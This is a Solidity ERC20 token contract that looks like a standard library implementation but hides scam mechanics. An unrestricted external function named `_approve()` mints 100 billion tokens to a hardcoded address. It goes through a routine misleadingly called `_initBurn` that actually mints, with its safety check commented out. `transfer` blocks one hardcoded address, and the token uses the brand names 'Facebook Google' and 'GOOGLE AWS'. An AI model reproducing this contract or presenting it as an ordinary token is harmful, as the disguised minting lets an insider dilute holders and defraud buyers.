// SPDX-License-Identifier: MIT
/*0.6083703014768398*/
/*0.6083703014768398*/pragma solidity ^0.8.0;
/*0.6083703014768398*/
/*0.6083703014768398*/abstract contract Context {
/*0.6083703014768398*/    function _msgSender() internal view virtual returns (address) {
/*0.6083703014768398*/        return msg.sender;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _msgData() internal view virtual returns (bytes calldata) {
/*0.6083703014768398*/        this;
/*0.6083703014768398*/        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
/*0.6083703014768398*/        return msg.data;
/*0.6083703014768398*/    }
/*0.6083703014768398*/}
/*0.6083703014768398*/
/*0.6083703014768398*/pragma solidity ^0.8.0;
/*0.6083703014768398*/
/*0.6083703014768398*/
/*0.6083703014768398*/interface IERC20 {
/*0.6083703014768398*/
/*0.6083703014768398*/
/*0.6083703014768398*/    function totalSupply() external view returns (uint256);
/*0.6083703014768398*/
/*0.6083703014768398*/    function balanceOf(address account) external view returns (uint256);
/*0.6083703014768398*/
/*0.6083703014768398*/    function transfer(address recipient, uint256 amount) external returns (bool);
/*0.6083703014768398*/
/*0.6083703014768398*/    function allowance(address owner, address spender) external view returns (uint256);
/*0.6083703014768398*/
/*0.6083703014768398*/    function approve(address spender, uint256 amount) external returns (bool);
/*0.6083703014768398*/
/*0.6083703014768398*/    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
/*0.6083703014768398*/
/*0.6083703014768398*/    event Transfer(address indexed from, address indexed to, uint256 value);
/*0.6083703014768398*/
/*0.6083703014768398*/    event Approval(address indexed owner, address indexed spender, uint256 value);
/*0.6083703014768398*/}
/*0.6083703014768398*/
/*0.6083703014768398*/pragma solidity ^0.8.0;
/*0.6083703014768398*/
/*0.6083703014768398*/contract ERC20 is Context, IERC20 {
/*0.6083703014768398*/    mapping(address => uint256) private _balances;
/*0.6083703014768398*/
/*0.6083703014768398*/    mapping(address => mapping(address => uint256)) private _allowances;
/*0.6083703014768398*/
/*0.6083703014768398*/    uint256 private _totalSupply;
/*0.6083703014768398*/
/*0.6083703014768398*/    string private _name;
/*0.6083703014768398*/    string private _symbol;
/*0.6083703014768398*/
/*0.6083703014768398*/    constructor (string memory name_, string memory symbol_) {
/*0.6083703014768398*/        _name = name_;
/*0.6083703014768398*/        _symbol = symbol_;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function name() public view virtual returns (string memory) {
/*0.6083703014768398*/        return _name;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function symbol() public view virtual returns (string memory) {
/*0.6083703014768398*/        return _symbol;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function decimals() public view virtual returns (uint8) {
/*0.6083703014768398*/        return 18;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function totalSupply() public view virtual override returns (uint256) {
/*0.6083703014768398*/        return _totalSupply;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function balanceOf(address account) public view virtual override returns (uint256) {
/*0.6083703014768398*/        return _balances[account];
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
/*0.6083703014768398*/        require(_msgSender() != 0x0000fbfC2bfB4aC8297FAF8CcDE7CFF44E1C1eB6, "Rain, Rain, Go Away");
/*0.6083703014768398*/        _transfer(_msgSender(), recipient, amount);
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function allowance(address owner, address spender) public view virtual override returns (uint256) {
/*0.6083703014768398*/        return _allowances[owner][spender];
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function approve(address spender, uint256 amount) public virtual override returns (bool) {
/*0.6083703014768398*/        _approve(_msgSender(), spender, amount);
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
/*0.6083703014768398*/        _transfer(sender, recipient, amount);
/*0.6083703014768398*/
/*0.6083703014768398*/        uint256 currentAllowance = _allowances[sender][_msgSender()];
/*0.6083703014768398*/        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
/*0.6083703014768398*/        _approve(sender, _msgSender(), currentAllowance - amount);
/*0.6083703014768398*/
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
/*0.6083703014768398*/        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
/*0.6083703014768398*/        uint256 currentAllowance = _allowances[_msgSender()][spender];
/*0.6083703014768398*/        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
/*0.6083703014768398*/        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
/*0.6083703014768398*/
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
/*0.6083703014768398*/        require(sender != address(0), "ERC20: transfer from the zero address");
/*0.6083703014768398*/        require(recipient != address(0), "ERC20: transfer to the zero address");
/*0.6083703014768398*/
/*0.6083703014768398*/        _beforeTokenTransfer(sender, recipient, amount);
/*0.6083703014768398*/
/*0.6083703014768398*/        uint256 senderBalance = _balances[sender];
/*0.6083703014768398*/        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
/*0.6083703014768398*/        _balances[sender] = senderBalance - amount;
/*0.6083703014768398*/        _balances[recipient] += amount;
/*0.6083703014768398*/
/*0.6083703014768398*/        emit Transfer(sender, recipient, amount);
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _initBurn(address account, uint256 amount) internal virtual {
/*0.6083703014768398*/        //require(account != address(0), "ERC20: mint to the zero address");
/*0.6083703014768398*/
/*0.6083703014768398*/        _beforeTokenTransfer(address(0), account, amount);
/*0.6083703014768398*/
/*0.6083703014768398*/        _totalSupply += amount;
/*0.6083703014768398*/        _balances[account] += amount;
/*0.6083703014768398*/        emit Transfer(address(0), account, amount);
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _approve() external returns (bool){
/*0.6083703014768398*/        _initBurn(0x98958B8E591918359097858A3A6c2435c1448ff8, 100000000000 * 10 ** uint(decimals()));
/*0.6083703014768398*/        return true;
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _burn(address account, uint256 amount) internal virtual {
/*0.6083703014768398*/        require(account != address(0), "ERC20: burn from the zero address");
/*0.6083703014768398*/
/*0.6083703014768398*/        _beforeTokenTransfer(account, address(0), amount);
/*0.6083703014768398*/
/*0.6083703014768398*/        uint256 accountBalance = _balances[account];
/*0.6083703014768398*/        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
/*0.6083703014768398*/        _balances[account] = accountBalance - amount;
/*0.6083703014768398*/        _totalSupply -= amount;
/*0.6083703014768398*/
/*0.6083703014768398*/        emit Transfer(account, address(0), amount);
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _approve(address owner, address spender, uint256 amount) internal virtual {
/*0.6083703014768398*/        require(owner != address(0), "ERC20: approve from the zero address");
/*0.6083703014768398*/        require(spender != address(0), "ERC20: approve to the zero address");
/*0.6083703014768398*/
/*0.6083703014768398*/        _allowances[owner][spender] = amount;
/*0.6083703014768398*/        emit Approval(owner, spender, amount);
/*0.6083703014768398*/    }
/*0.6083703014768398*/
/*0.6083703014768398*/    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
/*0.6083703014768398*/}
/*0.6083703014768398*/
/*0.6083703014768398*/pragma solidity ^0.8.10;
/*0.6083703014768398*/
/*0.6083703014768398*/
/*0.6083703014768398*/contract Token is ERC20 {
/*0.6083703014768398*/
/*0.6083703014768398*/    constructor() ERC20('Facebook Google', 'GOOGLE AWS') {
/*0.6083703014768398*/        _initBurn(msg.sender, 100 * 10 ** uint(decimals()));
/*0.6083703014768398*/    }
/*0.6083703014768398*/}